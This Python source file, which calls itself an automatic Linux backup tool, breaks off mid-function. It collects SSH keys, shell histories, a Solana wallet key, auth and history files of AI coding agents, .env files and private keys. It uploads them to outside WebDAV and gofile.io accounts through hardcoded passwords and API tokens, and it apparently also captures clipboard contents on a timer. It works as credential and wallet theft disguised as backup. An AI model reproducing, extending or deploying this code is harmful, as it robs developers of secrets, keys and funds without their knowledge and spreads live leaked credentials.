# -*- coding: utf-8 -*-
"""
自动备份工具-linux版本
"""

import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import subprocess
import getpass
import json
import glob
import hashlib
import random
import re
import stat
import fcntl
from urllib.parse import quote
from datetime import datetime, timedelta
from pathlib import Path


def _empty_backup_state():
    return {"version": 1, "files": {}, "pending_archives": {}}


def linux_name_prefix(username=None):
    """返回上传文件统一使用的 <用户前5字符>_linux_ 前缀。"""
    username = getpass.getuser() if username is None else username
    short_name = username[:5] if username else "user"
    return f"{short_name}_linux_"


def archive_group_key(path):
    """返回归档组名；分片归档与其原始归档归为同一组。"""
    name = os.path.basename(path)
    manifest_suffix = ".manifest.json"
    if name.endswith(manifest_suffix):
        return name[: -len(manifest_suffix)]
    marker = ".tar.gz.part"
    if marker in name:
        return name.split(marker, 1)[0] + ".tar.gz"
    return name


def group_archive_paths(paths):
    """按归档组名收集路径，用于按组判定上传是否完整。"""
    groups = {}
    for path in paths or []:
        groups.setdefault(archive_group_key(path), []).append(path)
    return groups


def is_archive_artifact(path):
    """判断路径是否属于备份归档、分片或清单。"""
    name = os.path.basename(str(path))
    return (
        name.endswith(".tar.gz")
        or ".tar.gz.part" in name
        or name.endswith(".manifest.json")
    )


def archive_part_number(path):
    """返回分片序号；非分片返回 None。"""
    match = re.search(r"\.tar\.gz\.part(\d+)$", os.path.basename(str(path)))
    return int(match.group(1)) if match else None


def sort_archive_group_paths(paths):
    """按分片顺序返回路径，并让清单最后上传。"""
    manifests = [path for path in paths if os.path.basename(path).endswith(".manifest.json")]
    parts = sorted(
        (path for path in paths if archive_part_number(path) is not None),
        key=archive_part_number,
    )
    others = sorted(
        path for path in paths
        if path not in manifests and archive_part_number(path) is None
    )
    return parts + others + manifests


import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")

class BackupConfig:
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）

    # 文件大小配置（单位：字节）
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # 单文件阈值：50MB（超过则分片）
    CHUNK_SIZE = 50 * 1024 * 1024             # 分片大小：50MB

    # 重试配置
    RETRY_COUNT = 5        # 最大重试次数
    RETRY_DELAY = 60       # 重试等待时间（秒）
    RETRY_MAX_DELAY = 300  # 单次重试最长等待
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
    UPLOAD_TOTAL_TIMEOUT = 30 * 60  # 单个文件/归档组的总上传时间预算
    VERIFY_UPLOAD = True   # 上传成功后尽量用 HEAD 验证远端大小

    # 备份间隔配置
    BACKUP_INTERVAL = 24 * 60 * 60  # 备份间隔时间：1天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
    STATE_MISSING_RETENTION_DAYS = 90  # 文件消失后保留索引的天数

    # 本地备份安全配置
    BACKUP_DIR_MODE = 0o700
    BACKUP_FILE_MODE = 0o600
    # 归档按原约定保持 0644；仅状态、日志等本地辅助文件使用 0600。
    ARCHIVE_FILE_MODE = 0o644
    CLIPBOARD_MAX_SIZE = 5 * 1024 * 1024

    # 性能优化常量
    TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6 为平衡值）
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    # 注意：当前采用原子轮换后上传，不直接清空正在写入的日志。
    # LOG_MAX_SIZE = 10 * 1024 * 1024  # 日志文件最大大小：10MB（已废弃）
    # LOG_BACKUP_COUNT = 10             # 保留的日志备份数量（已废弃）

    # 时间阈值文件配置
    THRESHOLD_FILE = str(Path.home() / ".dev/Backup/next_backup_time.txt")  # 时间阈值文件路径
    BACKUP_STATE_FILE = str(Path.home() / ".dev/Backup/linux_backup_state.json")  # 已上传文件指纹与待重试归档

    # 需要备份的服务器目录或文件
    SERVER_BACKUP_DIRS = [
        ".ssh",                     # SSH配置
        ".bashrc",
        ".profile",                    
        ".bash_history",            # Bash历史记录
        ".python_history",          # Python历史记录
        ".node_repl_history",       # Node.js REPL 历史记录
        ".config/solana/id.json",
        ".claude/config.json",
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".claude/history.jsonl",
        ".claude/channels/",
        ".codex/auth.json",
        ".codex/config.toml",
        ".codex/history.jsonl",
        ".hermes/.env",
        ".hermes/auth.json",
        ".hermes/config.yaml",
        ".hermes/channel_directory.json",
        ".hermes_history",
        ".openclaw/agents/",
        ".openclaw/workspace/.env",
        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
    ]

    # 需要备份的文件类型
    # 文档类型扩展名
    DOC_EXTENSIONS = [
        ".txt", ".json", ".csv", ".md", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
    ]
    # 配置类型扩展名
    CONFIG_EXTENSIONS = [
        ".pem", ".key", ".keystore", ".xml", ".ini", ".config", ".conf", ".json", ".env",
        ".yaml", ".yml", ".toml", ".wallet", "id_rsa", "id_ecdsa", "id_ed25519",
    ]
    # 排除的目录
    EXCLUDE_DIRS = [
        ".bashrc",
        ".profile",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".dev",              # 排除.dev目录，避免循环备份
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "myenv",
        "snap",
        "venv",
        ".venv",
        "node_modules",
        "dist",
        ".cache",
        ".vscode-server",
        "build",
        ".vscode-remote-ssh",
        "ylx-backup",
        "__pycache__",
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://upload.gofile.io/uploadfile",          # 自动（最近节点）
        "https://upload-ap-hkg.gofile.io/uploadfile",   # 亚太（香港）
        "https://upload-ap-sgp.gofile.io/uploadfile",   # 亚太（新加坡）
        "https://upload-ap-tyo.gofile.io/uploadfile",   # 亚太（东京）
        "https://upload-na-phx.gofile.io/uploadfile",   # 北美（凤凰城）
    ]

class BackupManager:
    
    def __init__(self):
        """初始化备份管理器"""
        if requests is None or HTTPBasicAuth is None:
            raise RuntimeError("缺少 requests 依赖，无法启动备份上传功能")
        self.config = BackupConfig()
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"  #infini-cloud-2
        self.infini_pass = "my95gfPVtKuDCpAK"
        # Infini 上传配置：主配置 + 备用配置（全部失败才会回退 GoFile）
        self.infini_configs = [
            {
                "name": "Infini-主配置",
                "url": self.infini_url,
                "user": self.infini_user,
                "password": self.infini_pass,
            },
            {
                "name": "Infini-备用配置",
                "url": "https://wajima.infini-cloud.net/dav/",
                "user": "cryptostarxp",  #infini-cloud-4
                "password": "LDW9ERV3xuUrHSjZ",
            },
        ]
        
        # GoFile API token（备选方案）：主 token 失败时回退到备用 token
        self.api_token = "GXPkms2fGdFYDLu17RQHlklDonEPfvY5"
        self.api_token_fallback = "z63HMixVGXceWW8heBKQaDqNrqTkp4p0"
        self.api_tokens = list(dict.fromkeys([
            self.api_token,
            self.api_token_fallback,
            "mrzh7pc0Up0eeBhH9Yy8RCbOXEg3xSQH",
            "9o0Su5ainOFK9fFxzLaiuRKPOxgaUmCm",
        ]))
        
        username = getpass.getuser()
        short_prefix = username[:5] if username else "user"
        self.user_prefix = linux_name_prefix(username)
        log_dir, log_name = os.path.split(self.config.LOG_FILE)
        if not log_name.startswith(self.user_prefix):
            self.config.LOG_FILE = os.path.join(log_dir, self.user_prefix + log_name)
        legacy_log_name = f"{short_prefix}_{log_name}" if not log_name.startswith(
            (self.user_prefix, f"{short_prefix}_linux")
        ) else None
        self.legacy_log_file = (
            os.path.join(log_dir, legacy_log_name) if legacy_log_name else None
        )
        if (self.legacy_log_file
                and os.path.exists(self.legacy_log_file)
                and not os.path.exists(self.config.LOG_FILE)):
            try:
                os.replace(self.legacy_log_file, self.config.LOG_FILE)
                self.legacy_log_file = None
            except OSError:
                pass
        self.config.INFINI_REMOTE_BASE_DIR = f"{self.user_prefix}backup"
        
        # 每个线程使用独立 requests.Session；Requests 不保证 Session 可跨线程共享。
        self._session_local = threading.local()
        self._sessions = []
        self._sessions_lock = threading.Lock()
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        self._clipboard_lock = threading.Lock()
        self._state_lock = threading.RLock()
        self._log_lock = threading.RLock()
        self._file_handler = None
        self._console_handler = None
        self._state_loaded_ok = True
        self._seen_state_keys = set()
        self._state = self._load_backup_state()
        
        # 使用集合优化扩展名检查性能
        self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
        self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
        # JTB相关标志
        self._clipboard_display_warned = False  # 是否已警告过 DISPLAY 不可用
        self._clipboard_display_error_time = 0  # 上次记录 DISPLAY 错误的时间
        self._clipboard_display_error_interval = 300  # DISPLAY 错误日志间隔（5分钟）
        self._setup_logging()

    @property
    def session(self):
        session = getattr(self._session_local, "session", None)
        if session is None:
            session = requests.Session()
            session.verify = True
            self._session_local.session = session
            with self._sessions_lock:
                self._sessions.append(session)
        return session

    def close(self):
        with self._sessions_lock:
            sessions, self._sessions = self._sessions, []
        for session in sessions:
            try:
                session.close()
            except Exception:
                pass

    def _setup_logging(self):
        """配置日志系统"""
        try:
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
            os.chmod(log_dir, self.config.BACKUP_DIR_MODE)

            file_handler = self._create_log_file_handler()

            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))

            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )

            # 仅移除本实例之前创建的 handler，不影响宿主程序的日志配置。
            for handler in root_logger.handlers[:]:
                if getattr(handler, "_ylx_backup_handler", False):
                    root_logger.removeHandler(handler)
                    handler.close()
            console_handler._ylx_backup_handler = True
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            self._file_handler = file_handler
            self._console_handler = console_handler
            
            logging.info("日志系统初始化完成")
        except Exception as e:
            print(f"设置日志系统时出错: {e}")

    def _create_log_file_handler(self, log_file=None):
        """创建可被轮转逻辑安全替换的日志文件 handler。"""
        log_file = log_file or self.config.LOG_FILE
        handler = logging.FileHandler(log_file, encoding='utf-8')
        try:
            os.chmod(log_file, self.config.BACKUP_FILE_MODE)
            handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            handler._ylx_backup_handler = True
        except Exception:
            handler.close()
            raise
        return handler

    @staticmethod
    def _ensure_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, mode=BackupConfig.BACKUP_DIR_MODE, exist_ok=True)
            os.chmod(directory_path, BackupConfig.BACKUP_DIR_MODE)
            return True
        except Exception as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path)
                if os.path.exists(directory_path):
                    logging.error(f"清理目录后仍存在: {directory_path}")
                    return False
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _is_within(path, parent):
        """返回 path 是否严格位于 parent 下（含 path == parent 时由调用方决定）。"""
        try:
            path_abs = os.path.abspath(path)
            parent_abs = os.path.abspath(parent)
            return os.path.commonpath([path_abs, parent_abs]) == parent_abs
        except (TypeError, ValueError):
            return False

    def _join_within(self, base, relative):
        """安全拼接目标路径，拒绝绝对路径和 .. 越界。"""
        if not relative or os.path.isabs(relative):
            return None
        if any(part == ".." for part in Path(relative).parts):
            return None
        joined = os.path.abspath(os.path.join(base, relative))
        return joined if self._is_within(joined, base) else None

    @staticmethod
    def _fsync_parent(path):
        try:
            directory_fd = os.open(os.path.dirname(os.path.abspath(path)), os.O_RDONLY)
            try:
                os.fsync(directory_fd)
            finally:
                os.close(directory_fd)
        except OSError:
            pass

    def _retry_delay(self, attempt):
        """指数退避并加入少量抖动，避免固定 60 秒等待。"""
        base = min(
            self.config.RETRY_DELAY * (2 ** min(attempt, 6)),
            self.config.RETRY_MAX_DELAY,
        )
        return base + random.uniform(0, min(5.0, base * 0.1))

    @staticmethod
    def _is_valid_file(file_path):
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    @staticmethod
    def _state_key(*parts):
        return os.path.normpath(os.path.join(*parts)).replace(os.sep, "/")

    @staticmethod
    def _hash_file(file_path):
        digest = hashlib.sha256()
        with open(file_path, "rb") as source:
            for chunk in iter(lambda: source.read(1024 * 1024), b""):
                digest.update(chunk)
        return digest.hexdigest()

    def _file_fingerprint(self, file_path):
        stat = os.stat(file_path)
        return {
            "kind": "file",
            "size": stat.st_size,
            "mtime_ns": stat.st_mtime_ns,
            "sha256": self._hash_file(file_path),
        }

    def _symlink_fingerprint(self, file_path):
        link_target = os.readlink(file_path)
        payload = link_target.encode("utf-8", "surrogateescape")
        stat = os.lstat(file_path)
        return {
            "kind": "symlink",
            "size": len(payload),
            "mtime_ns": stat.st_mtime_ns,
            "sha256": hashlib.sha256(payload).hexdigest(),
        }

    def _path_fingerprint(self, file_path, preserve_symlinks=False):
        if preserve_symlinks and os.path.islink(file_path):
            return self._symlink_fingerprint(file_path)
        return self._file_fingerprint(file_path)

    @staticmethod
    def _entry_matches(entry, fingerprint, compare_content=True):
        if not isinstance(entry, dict):
            return False
        if entry.get("kind") != fingerprint.get("kind"):
            return False
        if entry.get("size") != fingerprint.get("size"):
            return False
        if compare_content and entry.get("sha256") != fingerprint.get("sha256"):
            return False
        return True

    def _pending_contains(self, rel_key, fingerprint):
        for pending in self._state.get("pending_archives", {}).values():
            entry = pending.get("files", {}).get(rel_key) if isinstance(pending, dict) else None
            if self._entry_matches(entry, fingerprint, compare_content=True):
                return True
        return False

    def _source_change_status(self, rel_key, source_path, preserve_symlinks=False):
        """返回 (是否无需重新备份, 当前指纹)。"""
        seen_keys = getattr(self, "_seen_state_keys", None)
        if seen_keys is not None:
            seen_keys.add(rel_key)
        entry = self._state.get("files", {}).get(rel_key)

        if preserve_symlinks and os.path.islink(source_path):
            link_stat = os.lstat(source_path)
            kind = "symlink"
            size = len(os.readlink(source_path).encode("utf-8", "surrogateescape"))
            mtime_ns = link_stat.st_mtime_ns
        else:
            file_stat = os.stat(source_path)
            kind = "file"
            size = file_stat.st_size
            mtime_ns = file_stat.st_mtime_ns

        # 先用 stat 快速跳过绝大多数未变化文件；仅在大小或 mtime 变化时计算哈希。
        if (isinstance(entry, dict)
                and entry.get("kind") == kind
                and entry.get("size") == size
                and entry.get("mtime_ns") == mtime_ns
                and isinstance(entry.get("sha256"), str)):
            return True, dict(entry)

        fingerprint = self._path_fingerprint(source_path, preserve_symlinks=preserve_symlinks)
        if self._entry_matches(entry, fingerprint, compare_content=True):
            if entry.get("mtime_ns") != fingerprint.get("mtime_ns"):
                updated = dict(fingerprint)
                if "recorded_at_ns" in entry:
                    updated["recorded_at_ns"] = entry["recorded_at_ns"]
                self._state.setdefault("files", {})[rel_key] = updated
            return True, fingerprint

        if self._pending_contains(rel_key, fingerprint):
            return True, fingerprint
        return False, fingerprint

    def _copy_if_changed(self, source_path, target_path, rel_key, changed_records,
                         preserve_symlinks=False):
        """仅在内容变化时复制；返回 copied / skipped / failed。"""
        try:
            unchanged, fingerprint = self._source_change_status(
                rel_key, source_path, preserve_symlinks=preserve_symlinks
            )
            if unchanged:
                return "skipped"

            if not self._ensure_directory(os.path.dirname(target_path)):
                return "failed"

            if fingerprint.get("kind") == "symlink":
                if os.path.lexists(target_path):
                    if os.path.isdir(target_path) and not os.path.islink(target_path):
                        shutil.rmtree(target_path)
                    else:
                        os.remove(target_path)
                link_target = os.readlink(source_path)
                os.symlink(link_target, target_path)
                if os.readlink(target_path) != link_target:
                    os.remove(target_path)
                    logging.error(f"❌ 符号链接复制后校验失败: {rel_key}")
                    return "failed"
            else:
                shutil.copy2(source_path, target_path)
                copied_fingerprint = self._file_fingerprint(target_path)
                if (copied_fingerprint.get("size") != fingerprint.get("size")
                        or copied_fingerprint.get("sha256") != fingerprint.get("sha256")):
                    try:
                        os.remove(target_path)
                    except OSError:
                        pass
                    logging.error(f"❌ 复制后校验失败: {rel_key}")
                    return "failed"
                os.chmod(target_path, self.config.BACKUP_FILE_MODE)

            changed_records[rel_key] = fingerprint
            return "copied"
        except FileNotFoundError:
            logging.warning(f"⚠️ 备份期间文件已消失，跳过: {rel_key}")
            return "skipped"
        except Exception as e:
            try:
                if os.path.lexists(target_path) and not os.path.isdir(target_path):
                    os.remove(target_path)
            except OSError:
                pass
            logging.error(f"❌ 备份失败: {rel_key} - {str(e)}")
            return "failed"

    def _copy_specified_tree(self, source_path, target_path, item_name, changed_records):
        complete = True
        try:
            if os.path.islink(source_path):
                status = self._copy_if_changed(
                    source_path, target_path, self._state_key(item_name),
                    changed_records, preserve_symlinks=True
                )
                return status != "failed"

            if os.path.lexists(target_path):
                if os.path.isdir(target_path) and not os.path.islink(target_path):
                    shutil.rmtree(target_path)
                else:
                    os.remove(target_path)
            if not self._ensure_directory(target_path):
                return False

            exclude_dirs_lower = {ex.casefold() for ex in self.config.EXCLUDE_DIRS}
            def on_walk_error(error):
                nonlocal complete
                complete = False
                logging.error(f"❌ 遍历目录失败: {getattr(error, 'filename', source_path)} - {error}")

            for current_root, dirs, files in os.walk(
                    source_path, followlinks=False, onerror=on_walk_error):
                rel_root = os.path.relpath(current_root, source_path)
                target_root = target_path if rel_root == "." else os.path.join(target_path, rel_root)
                if not self._ensure_directory(target_root):
                    return False

                for name in list(dirs):
                    candidate = os.path.join(current_root, name)
                    rel_path = os.path.relpath(candidate, source_path)
                    if any(part.casefold() in exclude_dirs_lower for part in Path(rel_path).parts):
                        dirs.remove(name)
                        continue
                    if os.path.islink(candidate):
                        rel_key = self._state_key(item_name, rel_path)
                        status = self._copy_if_changed(
                            candidate, os.path.join(target_root, name), rel_key,
                            changed_records, preserve_symlinks=True
                        )
                        complete = complete and status != "failed"
                        dirs.remove(name)

                for name in files:
                    source_file = os.path.join(current_root, name)
                    rel_path = os.path.relpath(source_file, source_path)
                    rel_key = self._state_key(item_name, rel_path)
                    status = self._copy_if_changed(
                        source_file, os.path.join(target_root, name), rel_key,
                        changed_records, preserve_symlinks=True
                    )
                    complete = complete and status != "failed"
            return complete
        except Exception as e:
            logging.error(f"❌ 备份失败: {item_name} - {str(e)}")
            return False

    def _backup_specified_item(self, source_path, target_base, item_name, changed_records):
        """增量备份指定的文件或目录。"""
        try:
            target_path = self._join_within(target_base, item_name)
            if target_path is None:
                logging.error(f"❌ 指定备份项路径越界: {item_name}")
                return False
            if os.path.isfile(source_path) or os.path.islink(source_path):
                if not self._ensure_directory(os.path.dirname(target_path)):
                    return False
                before = len(changed_records)
                status = self._copy_if_changed(
                    source_path, target_path, self._state_key(item_name),
                    changed_records, preserve_symlinks=True
                )
                if status == "failed":
                    return False
                if self.config.DEBUG_MODE:
                    if len(changed_records) > before:
                        logging.info(f"已备份指定文件: {item_name}")
                    else:
                        logging.debug(f"⏭️ 指定文件未变化: {item_name}")
                return True

            if not self._ensure_directory(os.path.dirname(target_path)):
                return False
            before = len(changed_records)
            if not self._copy_specified_tree(source_path, target_path, item_name, changed_records):
                return False
            if self.config.DEBUG_MODE:
                if len(changed_records) > before:
                    logging.info(f"📁 已备份指定目录: {item_name}/")
                else:
                    logging.debug(f"⏭️ 指定目录未变化: {item_name}/")
            return True
        except Exception as e:
            logging.error(f"❌ 备份失败: {item_name} - {str(e)}")
            return False

    def _load_backup_state(self):
        state = _empty_backup_state()
        self._state_loaded_ok = True
        try:
            state_path = self.config.BACKUP_STATE_FILE
            if not os.path.exists(state_path):
                return state
            with open(state_path, "r", encoding="utf-8") as source:
                loaded = json.load(source)
            if isinstance(loaded, dict):
                files = loaded.get("files")
                pending = loaded.get("pending_archives")
                if isinstance(files, dict):
                    state["files"] = {
                        key: value for key, value in files.items() if isinstance(value, dict)
                    }
                if isinstance(pending, dict):
                    state["pending_archives"] = {
                        key: value for key, value in pending.items()
                        if isinstance(value, dict) and isinstance(value.get("files"), dict)
                    }
        except Exception as e:
            self._state_loaded_ok = False
            logging.error(f"读取备份状态失败，将重新建立索引: {e}")
        return state

    def _save_backup_state(self):
        temp_path = None
        try:
            with self._state_lock:
                state_path = Path(self.config.BACKUP_STATE_FILE)
                state_path.parent.mkdir(mode=self.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
                temp_path = state_path.with_name(
                    f".{state_path.name}.tmp-{os.getpid()}-{threading.get_ident()}"
                )
                with open(temp_path, "w", encoding="utf-8") as target:
                    json.dump(self._state, target, ensure_ascii=False, indent=2)
                    target.flush()
                    os.fsync(target.fileno())
                os.chmod(temp_path, self.config.BACKUP_FILE_MODE)
                os.replace(temp_path, state_path)
                os.chmod(state_path, self.config.BACKUP_FILE_MODE)
                self._fsync_parent(state_path)
            return True
        except Exception as e:
            # 状态写入失败意味着磁盘上的 pending/指纹可能与实际归档不一致。
            # 本进程内改为保守扫描所有归档，避免后续清理误删尚未登记的归档。
            self._state_loaded_ok = False
            logging.error(f"保存备份状态失败: {e}")
            try:
                if temp_path is not None and temp_path.exists():
                    temp_path.unlink()
            except OSError:
                pass
            return False

    def register_pending_archive(self, archive_path, file_records):
        """归档生成后登记到状态文件，上传成功前不会被重复打包。"""
        if not file_records:
            return True
        key = archive_group_key(archive_path)
        with self._state_lock:
            self._state.setdefault("pending_archives", {})[key] = {
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "created_at_ns": time.time_ns(),
                "files": dict(file_records),
            }
            return self._save_backup_state()

    def mark_archive_uploaded(self, archive_key):
        """仅在整组归档上传成功后，把文件指纹写入已上传索引。"""
        key = archive_group_key(archive_key)
        with self._state_lock:
            pending = self._state.setdefault("pending_archives", {}).pop(key, None)
            if not pending:
                return True
            pending_time = pending.get("created_at_ns", 0)
            for rel_key, fingerprint in pending.get("files", {}).items():
                if isinstance(fingerprint, dict):
                    existing = self._state.setdefault("files", {}).get(rel_key, {})
                    if pending_time < existing.get("recorded_at_ns", 0):
                        continue
                    updated = dict(fingerprint)
                    updated["recorded_at_ns"] = pending_time
                    self._state["files"][rel_key] = updated
            return self._save_backup_state()

    def reconcile_pending_archives(self, existing_keys):
        """清理已经不存在的待上传记录，让对应文件在下一轮重新备份。"""
        existing = set(existing_keys)
        with self._state_lock:
            pending = self._state.setdefault("pending_archives", {})
            stale_keys = [key for key in pending if key not in existing]
            if not stale_keys:
                return True
            for key in stale_keys:
                pending.pop(key, None)
            logging.warning(f"⚠️ 清理 {len(stale_keys)} 个已不存在的待上传归档记录")
            return self._save_backup_state()

    def _prune_backup_state(self, source_dir):
        """清理长期不存在且不在 pending 中的索引，避免状态文件无限增长。"""
        now_ns = time.time_ns()
        retention_days = getattr(self.config, "STATE_MISSING_RETENTION_DAYS", 90)
        retention_ns = int(retention_days * 24 * 60 * 60 * 10**9)
        pending_keys = {
            rel_key
            for pending in self._state.get("pending_archives", {}).values()
            if isinstance(pending, dict)
            for rel_key in pending.get("files", {})
        }
        removed = []
        with self._state_lock:
            for rel_key, entry in list(self._state.get("files", {}).items()):
                if rel_key in self._seen_state_keys or rel_key in pending_keys:
                    continue
                source_path = os.path.join(source_dir, rel_key)
                if os.path.lexists(source_path):
                    continue
                missing_since = entry.get("missing_since_ns")
                if not isinstance(missing_since, int):
                    entry["missing_since_ns"] = now_ns
                    continue
                if now_ns - missing_since >= retention_ns:
                    self._state["files"].pop(rel_key, None)
                    removed.append(rel_key)
            if removed:
                logging.info(f"🧹 清理 {len(removed)} 个长期不存在的索引记录")
                return self._save_backup_state()
        return True

    def backup_linux_files(self, source_dir, target_dir):
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.isdir(source_dir):
            logging.error("❌ Linux源目录不存在或不是目录")
            return None, None, False
        if os.path.islink(target_dir):
            logging.error("❌ 备份目标目录不能是符号链接")
            return None, None, False

        source_real = Path(source_dir).resolve()
        target_real = Path(target_dir).resolve()
        safe_target_root = (source_real / ".dev" / "Backup").resolve()
        target_inside_safe_root = safe_target_root in target_real.parents
        if (target_real == source_real or
                target_real in source_real.parents or
                target_real == safe_target_root or
                (source_real in target_real.parents and not target_inside_safe_root)):
            logging.error("❌ 备份目标目录不能与源目录存在包含关系")
            return None, None, False

        # 获取用户名前缀
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"

        target_docs = os.path.join(target_dir, f"{user_prefix}_docs") # 备份文档的目标目录
        target_configs = os.path.join(target_dir, f"{user_prefix}_configs") # 备份配置文件的目标目录
        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")  # 新增指定目录/文件的备份目录

        if not self._clean_directory(target_dir):
            return None, None, False

        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified]):
            return None, None, False

        changed_records = {"docs": {}, "configs": {}, "specified": {}}
        complete = True
        self._seen_state_keys = set()

        source_dir_abs = os.path.abspath(source_dir)
        backed_up_dirs = set()
        backed_up_files = set()

        # 首先备份指定目录或文件 (SERVER_BACKUP_DIRS)
        for specific_path in self.config.SERVER_BACKUP_DIRS:
            if (not specific_path
                    or os.path.isabs(specific_path)
                    or any(part == ".." for part in Path(specific_path).parts)):
                logging.error(f"❌ 指定备份项路径不合法: {specific_path}")
                complete = False
                continue
            if any(ch in specific_path for ch in ["*", "?", "["]):
                matched_paths = glob.glob(os.path.join(source_dir, specific_path))
            else:
                candidate = os.path.join(source_dir, specific_path)
                matched_paths = [candidate] if os.path.lexists(candidate) else []
            for matched_path in matched_paths:
                matched_abs = os.path.abspath(matched_path)
                if not self._is_within(matched_abs, source_dir_abs):
                    logging.error(f"❌ 指定备份项越界: {matched_path}")
                    complete = False
                    continue
                rel_name = os.path.relpath(matched_abs, source_dir_abs)
                if not self._backup_specified_item(
                    matched_abs, target_specified, rel_name, changed_records["specified"]
                ):
                    complete = False
                if os.path.isdir(matched_abs) and not os.path.islink(matched_abs):
                    backed_up_dirs.add(matched_abs)
                elif os.path.isfile(matched_abs) or os.path.islink(matched_abs):
                    backed_up_files.add(matched_abs)
        
        docs_count = configs_count = skipped_count = 0
        target_dir_abs = os.path.abspath(target_dir)
        exclude_dirs_lower = {ex.casefold() for ex in self.config.EXCLUDE_DIRS}

        def on_walk_error(error):
            nonlocal complete
            complete = False
            logging.error(f"❌ 遍历目录失败: {getattr(error, 'filename', source_dir)} - {error}")

        for root, dirs, files in os.walk(source_dir, topdown=True, onerror=on_walk_error):
            root_abs = os.path.abspath(root)

            # 每一层都应用排除规则，并阻止进入已作为指定项备份的目录或目标目录。
            kept_dirs = []
            for name in dirs:
                candidate_abs = os.path.abspath(os.path.join(root, name))
                if name.casefold() in exclude_dirs_lower:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"⏭️ 已排除目录: {os.path.relpath(candidate_abs, source_dir_abs)}/")
                    continue
                if any(self._is_within(candidate_abs, backed_dir) for backed_dir in backed_up_dirs):
                    continue
                if self._is_within(candidate_abs, target_dir_abs):
                    continue
                if os.path.islink(candidate_abs):
                    if self.config.DEBUG_MODE:
                        logging.debug(f"⏭️ 跳过符号链接目录: {os.path.relpath(candidate_abs, source_dir_abs)}/")
                    continue
                kept_dirs.append(name)
            dirs[:] = kept_dirs

            if any(self._is_within(root_abs, backed_dir) for backed_dir in backed_up_dirs):
                dirs[:] = []
                continue
            if self._is_within(root_abs, target_dir_abs):
                dirs[:] = []
                continue

            for file in files:
                # 判断文件是否为文档类型或配置类型（使用集合优化性能）
                file_lower = file.lower()
                is_doc = any(file_lower.endswith(ext) for ext in self.doc_extensions_set)
                is_config = any(file_lower.endswith(ext) for ext in self.config_extensions_set)

                # 如果既不是文档也不是配置，跳过
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                source_file_abs = os.path.abspath(source_file)
                if source_file_abs in backed_up_files:
                    continue

                try:
                    file_stat = os.lstat(source_file_abs)
                except FileNotFoundError:
                    logging.warning(f"⚠️ 扫描期间文件已消失，跳过: {source_file_abs}")
                    continue
                preserve_symlinks = stat.S_ISLNK(file_stat.st_mode)
                if not preserve_symlinks and not stat.S_ISREG(file_stat.st_mode):
                    logging.warning(f"⚠️ 跳过非普通文件: {source_file_abs}")
                    continue

                # 根据文件类型确定目标基路径
                target_base = target_docs if is_doc else target_configs
                # 获取相对于源目录的路径
                relative_path = "" if root_abs == source_dir_abs else os.path.relpath(root, source_dir)
                # 构建目标子目录路径
                target_sub_dir = os.path.join(target_base, relative_path) if relative_path else target_base
                # 构建目标文件路径
                target_file = os.path.join(target_sub_dir, file)

